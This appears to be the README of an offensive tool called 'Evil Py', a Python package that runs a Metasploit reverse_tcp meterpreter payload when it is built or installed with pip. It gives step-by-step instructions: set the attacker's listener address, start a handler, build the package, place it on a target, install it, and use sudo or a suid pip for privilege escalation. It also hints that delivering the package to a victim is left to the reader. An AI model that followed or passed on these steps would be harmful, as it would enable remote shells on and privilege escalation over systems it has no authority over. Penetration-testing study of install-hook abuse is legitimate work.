# Evil Py
This is a python package MSF Payload developed by sn0wfa11.

Python users need to be aware that packages installed via `pip` have the ability to execute python code as part of the install process. This can be leveraged in situations where an attacker is able to execute pip commands remotely or for privilege escalation when a low priv user has sudo rights to `pip` or root's suid bit is set. 

https://github.com/sn0wfa11

## Setup Instructions
- Change the IP and Port in setup.py to your LHOST and LPORT
- Start a Metasploit listener for payload `python/meterpreter/reverse_tcp`
```
msf > handler -p python/meterpreter/reverse_tcp -H <Your LHOST> -P <Your LPORT>
```
- Install the package build process dependencies
```
python -m pip install --user --upgrade setuptools wheel
```
- Build the package 
  - Go to the directory where setup.py is located
  - **Note: This will pop a shell on you build computer! Great way to test the package**
  - This will throw errors, but don't worry about it. *This is intentional as I don't want any of this uploaded to the official Python package deployment system.*
```
python setup.py sdist bdist_wheel
```
- Grab the .tar.gz file out of the /dist folder and place this on your target. 
  - There may be multiple ways to get the package to the target... but that's for you to research. ;)
- Run `pip install evil_py-<version>.tar.gz`
- Works great for PE if you have sudo rights for pip or pip's suid bit is set!
